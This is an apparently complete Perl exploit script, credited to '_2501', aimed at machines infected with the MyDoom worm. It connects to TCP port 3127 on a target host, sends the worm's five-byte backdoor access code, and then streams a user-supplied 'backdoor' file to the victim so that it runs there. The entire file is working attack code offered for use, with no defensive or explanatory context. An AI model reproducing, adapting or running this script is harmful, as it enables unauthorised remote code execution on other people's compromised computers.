#!/usr/bin/perl -w
# exploit 4 mydoom infected systems by _2501
use IO::Socket;
$args = @ARGV;
if ($args eq 2) {
$conn = IO::Socket::INET->new(	Proto=>"tcp",
			        PeerPort=>3127,
			        PeerAddr=>$ARGV[0]) or die "can't connect 2 $ARGV[0]\n";
@pass =    (133,19,60,158,162);
if ($conn){
    foreach $pchar (@pass) { print $conn chr($pchar); }
    open (BACKD, "<$ARGV[1]");
    while (<BACKD>) {print $conn $_; }
    close BACKD;
}
} else { print "usage: $0 host backdoor\n"; }